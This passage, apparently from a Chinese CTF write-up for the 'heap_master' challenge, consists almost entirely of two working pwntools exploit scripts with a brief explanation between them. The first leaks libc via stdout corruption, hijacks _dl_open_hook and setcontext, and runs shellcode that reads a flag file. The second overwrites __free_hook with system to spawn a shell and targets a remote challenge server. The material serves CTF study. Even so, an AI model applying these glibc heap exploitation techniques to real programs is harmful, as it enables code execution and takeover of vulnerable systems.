pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">2</span></span><br><span class="line"></span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_ld</span><span class="params">(binary, ld)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    Force to use assigned new ld.so by changing the binary</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.access(ld, os.R_OK):</span><br><span class="line">        log.failure(<span class="string">"Invalid path &#123;&#125; to ld"</span>.format(ld))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(binary, ELF):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.access(binary, os.R_OK):</span><br><span class="line">            log.failure(<span class="string">"Invalid path &#123;&#125; to binary"</span>.format(binary))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        binary = ELF(binary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> segment <span class="keyword">in</span> binary.segments:</span><br><span class="line">        <span class="keyword">if</span> segment.header[<span class="string">'p_type'</span>] == <span class="string">'PT_INTERP'</span>:</span><br><span class="line">            size = segment.header[<span class="string">'p_memsz'</span>]</span><br><span class="line">            addr = segment.header[<span class="string">'p_paddr'</span>]</span><br><span class="line">            data = segment.data()</span><br><span class="line">            <span class="keyword">if</span> size &lt;= len(ld):</span><br><span class="line">                log.failure(<span class="string">"Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;"</span>.format(data, ld))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            binary.write(addr, ld.ljust(size, <span class="string">'\x00'</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> os.access(<span class="string">'/tmp/pwn'</span>, os.F_OK): os.mkdir(<span class="string">'/tmp/pwn'</span>)</span><br><span class="line">            path = <span class="string">'/tmp/pwn/&#123;&#125;_debug'</span>.format(os.path.basename(binary.path))</span><br><span class="line">            <span class="keyword">if</span> os.access(path, os.F_OK):</span><br><span class="line">                os.remove(path)</span><br><span class="line">                info(<span class="string">"Removing exist file &#123;&#125;"</span>.format(path))</span><br><span class="line">            binary.save(path)</span><br><span class="line">            os.chmod(path, <span class="number">0b111000000</span>) <span class="comment">#rwx------</span></span><br><span class="line">    success(<span class="string">"PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;"</span>.format(data, ld, path))</span><br><span class="line">    <span class="keyword">return</span> ELF(path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    stdout_addr = <span class="number">0x2620</span></span><br><span class="line">    elf = ELF(<span class="string">'./heap_master'</span>)</span><br><span class="line">    p = process(<span class="string">'./heap_master'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">    stdout_addr = <span class="number">0x5600</span></span><br><span class="line">    elf = change_ld(<span class="string">"./heap_master"</span>,<span class="string">'./ld-linux-x86-64.so.2'</span>)</span><br><span class="line">    p = elf.process(env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"offset: "</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(offset)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"offset: "</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    offset = <span class="number">0x8800</span><span class="number">-0x7a0</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Edit(offset+<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x331</span>))<span class="comment">#0</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#1</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>))<span class="comment">#2</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#3</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x411</span>))<span class="comment">#4</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x410</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#5</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#set two main_arena addr</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>+<span class="number">0x100</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>+<span class="number">0x10</span>)</span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x110</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>))</span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)</span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#recover</span></span><br><span class="line">    <span class="comment">#Edit(0x330+0x30,p64(0)+p64(0x411))#2 again</span></span><br><span class="line"></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x3f0</span>,p64(<span class="number">0x3f0</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x8</span>,p64(<span class="number">0x3f1</span>)+p64(<span class="number">0</span>)+p16(stdout_addr<span class="number">-0x10</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x18</span>+<span class="number">0x8</span>,p64(<span class="number">0</span>)+p16(stdout_addr+<span class="number">0x19</span><span class="number">-0x20</span>))</span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x410</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    <span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">        p.recvn(<span class="number">0x18</span>)</span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7ffff7dd06e0</span> - <span class="number">0x7ffff7a0d000</span>)</span><br><span class="line">        <span class="comment">#map</span></span><br><span class="line">        map_addr = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0xc13b1800</span><span class="number">-0xc13a9000</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        map_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x8800</span></span><br><span class="line">        libc_base = u64(p.recv(<span class="number">8</span>)) - (<span class="number">0x7ffff7dd5683</span><span class="number">-0x7ffff7a37000</span>)</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    log.success(<span class="string">"map addr =&gt; "</span> + hex(map_addr))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    Edit(offset+<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x331</span>))<span class="comment">#0</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#1</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x511</span>))<span class="comment">#2</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#3</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x511</span>))<span class="comment">#4</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x510</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#5</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))<span class="comment">#6</span></span><br><span class="line">    libc.address =  libc_base</span><br><span class="line">    _dl_open_hook = libc_base + (<span class="number">0x7ffff7dd92e0</span><span class="number">-0x7ffff7a37000</span>)</span><br><span class="line"></span><br><span class="line">    Delete(offset+<span class="number">0x10</span>)<span class="comment">#0</span></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    mov_rdi_call_rbx = libc_base + <span class="number">0x7fd7d</span></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    Delete(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x510</span>+<span class="number">0x30</span>+<span class="number">0x10</span>)<span class="comment">#4</span></span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x3f1</span>)+p64(<span class="number">0</span>)+p64(_dl_open_hook<span class="number">-0x10</span>)+p64(<span class="number">0</span>)+p64(_dl_open_hook<span class="number">-0x20</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x330</span>+<span class="number">0x30</span>+<span class="number">0x3f0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">    Add(<span class="number">0x90</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p,'b *setcontext+53')</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># .text:000000000007FD7D                 mov     rdi, [rbx+48h]</span></span><br><span class="line"><span class="comment"># .text:000000000007FD81                 mov     rsi, r13</span></span><br><span class="line"><span class="comment"># .text:000000000007FD84                 call    qword ptr [rbx+40h]</span></span><br><span class="line"><span class="comment"># 0x7fae9ce44b75 &lt;setcontext+53&gt;: mov    rsp,QWORD PTR [rdi+0xa0]</span></span><br><span class="line"></span><br><span class="line">    Edit(offset+<span class="number">0x8a0</span>,p64(mov_rdi_call_rbx))</span><br><span class="line">    Edit(offset+<span class="number">0x8a0</span>+<span class="number">0x40</span>,p64(libc.sym[<span class="string">'setcontext'</span>]+<span class="number">53</span>)+p64(map_addr+<span class="number">0x200</span>))</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    p_rsp = libc_base + <span class="number">0x0000000000003870</span></span><br><span class="line">    Edit(offset+<span class="number">0x200</span>+<span class="number">0x68</span>,p64(map_addr))</span><br><span class="line">    Edit(offset+<span class="number">0x200</span>+<span class="number">0x70</span>,p64(<span class="number">0x10000</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x200</span>+<span class="number">0x88</span>,p64(<span class="number">7</span>))</span><br><span class="line">    Edit(offset+<span class="number">0x200</span>+<span class="number">0xa0</span>,p64(map_addr+offset+<span class="number">0x200</span>)+p64(libc.sym[<span class="string">'mprotect'</span>]))</span><br><span class="line">    <span class="comment">#sc</span></span><br><span class="line">    sc = asm(<span class="string">'mov rdi,'</span>+str(map_addr+offset))</span><br><span class="line">    sc += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">            xor rsi,rsi</span></span><br><span class="line"><span class="string">            xor rdx,rdx</span></span><br><span class="line"><span class="string">            mov rax,2</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov rdi,rax</span></span><br><span class="line"><span class="string">            '''</span>)</span><br><span class="line">    sc += asm(<span class="string">'mov rsi,'</span>+str(map_addr+<span class="number">0x300</span>))</span><br><span class="line">    sc += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">            mov rdx,48</span></span><br><span class="line"><span class="string">            mov rax,0</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            mov rdi,1</span></span><br><span class="line"><span class="string">            mov rax,1</span></span><br><span class="line"><span class="string">            syscall</span></span><br><span class="line"><span class="string">            '''</span>)</span><br><span class="line">    Edit(offset,<span class="string">'./flag\x00'</span>)</span><br><span class="line">    Edit(offset+<span class="number">0x1f8</span>,<span class="string">'./flag\x00\x00'</span>+p64(map_addr+<span class="number">0x208</span>)+sc)</span><br><span class="line">    <span class="comment">#offset+0x8900</span></span><br><span class="line">    Delete(<span class="number">111</span>)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h4 id="方法三：-unsorted-bin-free-hook"><a href="#方法三：-unsorted-bin-free-hook" class="headerlink" title="方法三： unsorted bin+free_hook"></a>方法三： unsorted bin+free_hook</h4><p>参考链接：<a href="https://z3r3f.gitee.io/2019/05/12/2019StartCTF/" target="_blank" rel="noopener">https://z3r3f.gitee.io/2019/05/12/2019StartCTF/</a></p>
<p>前面是unsorted bin的利用，来改global_max_fast和leak地址，和方法一的前部分是一样的</p>
<p>后面是利用free 指定大小的chunk 填入main_arena fastbinY的队列，覆盖free_hook<br>所以我们找到main_arena到free_hook的偏移来算出chunk的指定size<br>然后改值为system，delete内容为’/bin/sh’的chunk就可以getshell了</p>
<h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> sc_expwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line"><span class="comment"># p = process('./heap_master')</span></span><br><span class="line">p=remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27915</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"><span class="comment"># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'size: '</span>, str(size))</span><br><span class="line">	<span class="comment"># else:</span></span><br><span class="line">	<span class="comment"># 	self.sendline('1')</span></span><br><span class="line">	<span class="comment"># 	self.sendline(str(size))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">    <span class="comment"># if self.wait:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'offset: '</span>, str(offset))</span><br><span class="line">    p.sendlineafter(<span class="string">'size: '</span>, str(len(content)))</span><br><span class="line">    p.sendafter(<span class="string">'content: '</span>, content)</span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sendline('2')</span></span><br><span class="line">        <span class="comment">#     self.sendline(str(offset))</span></span><br><span class="line">        <span class="comment">#     self.sendline(str(len(content)))</span></span><br><span class="line">        <span class="comment">#     self.send(content)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_</span><span class="params">(offset,content)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.sendline(str(offset))</span><br><span class="line">	p.sendline(str(len(content)))</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(offset)</span>:</span></span><br><span class="line">	<span class="comment"># if self.wait:</span></span><br><span class="line">	p.sendlineafter(<span class="string">'&gt;&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">'offset: '</span>, str(offset))</span><br><span class="line">	<span class="comment"># else:</span></span><br><span class="line">	<span class="comment"># 	self.sendline('3')</span></span><br><span class="line">	<span class="comment"># 	self.sendline(str(offset))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free_</span><span class="params">(offset)</span>:</span></span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.sendline(str(offset))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">libc_guess = <span class="number">0x7ffff7a0d000</span></span><br><span class="line">offset_libc_free_hook= libc_guess +libc.symbols[<span class="string">'__free_hook'</span>] </span><br><span class="line"><span class="keyword">print</span> hex(offset_libc_free_hook)</span><br><span class="line">offset_max_fast   = offset_libc_free_hook +<span class="number">0x50</span></span><br><span class="line"><span class="comment"># offset_max_fast=libc_guess+libc.symbols['global_max_fast']</span></span><br><span class="line">offset_libc_stdout=libc_guess+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x8</span>,p64(<span class="number">0x91</span>)) <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0x98</span>, p64(<span class="number">0x21</span>)) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0xb8</span>, p64(<span class="number">0x21</span>)) <span class="comment">#2</span></span><br><span class="line">free(<span class="number">0x10</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit(<span class="number">0x18</span>, p16((offset_max_fast<span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line">malloc(<span class="number">0x80</span>)<span class="comment">#global_max_fast 赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0xf1</span>))</span><br><span class="line">edit(<span class="number">0xf8</span>, p64(<span class="number">0x11</span>)) </span><br><span class="line"></span><br><span class="line">free(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0x18</span>, p16((offset_libc_stdout+<span class="number">0x10</span><span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>)) <span class="comment">#read_end</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">edit_(<span class="number">0x8</span>, p64(<span class="number">0xf1</span>))</span><br><span class="line">free_(<span class="number">0x10</span>)</span><br><span class="line">edit_(<span class="number">0x8</span>, p64(<span class="number">0x91</span>))</span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit_(<span class="number">0x18</span>, p16((offset_libc_stdout+<span class="number">0x20</span><span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>)) <span class="comment">#write_base</span></span><br><span class="line">malloc_(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x20</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">fake = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(fake)</span><br><span class="line">addr_buf_base = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(addr_buf_base)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-16</span> - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">p.recv(<span class="number">0x838</span>)</span><br><span class="line">addr_stack= u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3</span></span><br><span class="line"><span class="keyword">print</span> hex(addr_stack)</span><br><span class="line"></span><br><span class="line">libc.address=libc_addr</span><br><span class="line">addr_libc_gets          = libc.sep_function[<span class="string">'gets'</span>]</span><br><span class="line">addr_libc_stdout        = libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">addr_libc_dl_open_hook  = libc.symbols[<span class="string">'_dl_open_hook'</span>]</span><br><span class="line">addr_libc_io_file_jumps = libc.symbols[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">addr_libc_io_str_jumps  = addr_libc_io_file_jumps + <span class="number">0xc0</span></span><br><span class="line">fastbin_ptr=libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x1c88</span> +<span class="number">8</span></span><br><span class="line">free_hook=libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">system_addr=libc.sym[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size=<span class="number">0x3920</span></span><br><span class="line">fake_size=p64(size+<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0x38</span>,fake_size)</span><br><span class="line">edit(<span class="number">0x30</span>+size,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">free(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x40</span>,p64(system_addr))<span class="comment">#修改fd为system</span></span><br><span class="line">malloc(<span class="number">0x3910</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x110</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">0x110</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

